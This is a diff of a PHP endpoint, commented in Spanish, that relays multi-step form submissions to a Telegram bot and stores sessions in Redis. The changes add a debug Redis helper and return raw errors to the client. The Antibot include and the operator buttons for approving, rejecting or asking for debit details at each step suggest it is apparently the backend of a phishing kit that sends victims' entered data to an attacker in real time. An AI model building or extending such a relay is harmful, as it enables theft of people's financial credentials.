@@ -3,7 +3,6 @@
  * ================================================================
  * API Send — Envía datos a Telegram desde el backend
  * ================================================================
- * El token del bot NUNCA viaja al frontend.
  */
 
 require_once __DIR__ . '/../Antibot.php';
@@ -35,7 +34,6 @@ if (empty($step) || empty($message) || empty($clientSessionId)) {
     exit;
 }
 
-// ── Usar sessionId del cliente ──
 $sessionId = $input['sessionId'] ?? '';
 if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
     http_response_code(400);
@@ -43,20 +41,20 @@ if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
     exit;
 }
 
-// ── Función auxiliar para comunicarse con Redis usando la variable REDIS_URL ──
-function upstash_redis($command, array $args = []) {
+// ── Función robusta para comunicarse con Redis ──
+function upstash_redis_debug($command, array $args = []) {
     $redisUrl = getenv('REDIS_URL');
-    if (!$redisUrl) return null;
+    if (!$redisUrl) return "ERROR: REDIS_URL no está definida en Vercel";
     
     $parsed = parse_url($redisUrl);
     $host = $parsed['host'] ?? '';
-    $pass = $parsed['pass'] ?? '';
+    // Extraer contraseña o token (soporta formato rediss://default:TOKEN@HOST o url directa)
+    $pass = $parsed['pass'] ?? ($parsed['user'] ?? '');
     
-    if (empty($host) || empty($pass)) return null;
+    if (empty($host)) return "ERROR: No se pudo extraer el host de REDIS_URL";
+    if (empty($pass)) return "ERROR: No se pudo extraer el token de autenticación de REDIS_URL";
 
-    // Usar HTTPS estándar (puerto 443 implícito)
     $url = "https://{$host}";
-    
     $payload = array_merge([$command], $args);
     
     $ch = curl_init($url);
@@ -74,9 +72,13 @@ function upstash_redis($command, array $args = []) {
     
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curlError = curl_error($ch);
     curl_close($ch);
     
-    if (!$response || $httpCode !== 200) return null;
+    if ($httpCode !== 200) {
+        return "ERROR_HTTP_{$httpCode}: " . ($response ?: $curlError);
+    }
+    
     $data = json_decode($response, true);
     return $data['result'] ?? null;
 }
@@ -85,7 +87,6 @@ $config   = require __DIR__ . '/../config.php';
 $botToken = $config['bot_token'];
 $chatId   = $config['chat_id'];
 
-// ── Todas las opciones disponibles en TODOS los pasos para control total del admin ──
 $buttons = [
     ['text' => '✅ Aprobar',   'callback_data' => "aprobar_{$step}_{$sessionId}"],
     ['text' => '💳 Débito',    'callback_data' => "debito_{$step}_{$sessionId}"],
@@ -98,7 +99,6 @@ $buttons = [
     ['text' => '❌ Rechazar',  'callback_data' => "rechazar_{$step}_{$sessionId}"]
 ];
 
-// Agrupar de 2 en 2 para mejor visualización
 $keyboard = [];
 $row = [];
 foreach ($buttons as $i => $btn) {
@@ -146,7 +146,6 @@ if (!$data['ok']) {
 
 $messageId = $data['result']['message_id'] ?? null;
 
-// ── Guardar sesión en Redis (Compatible con Vercel Serverless) ──
 $sessionData = [
     'sessionId'    => $sessionId,
     'currentStep'  => $step,
@@ -158,12 +157,12 @@ $sessionData = [
     'messageText'  => $message
 ];
 
-// Guardar en Redis usando SET con expiración de 1 hora (3600 segundos)
-$redisResult = upstash_redis('SET', [$sessionId, json_encode($sessionData), 'EX', 3600]);
+// Guardar en Redis sin expiración compleja para descartar errores de sintaxis
+$redisResult = upstash_redis_debug('SET', [$sessionId, json_encode($sessionData)]);
 
-if ($redisResult === null) {
+if (is_string($redisResult) && str_starts_with($redisResult, 'ERROR')) {
     http_response_code(500);
-    echo json_encode(['ok' => false, 'error' => 'No se pudo guardar la sesión en Redis']);
+    echo json_encode(['ok' => false, 'error' => $redisResult]);
     exit;
 }
 
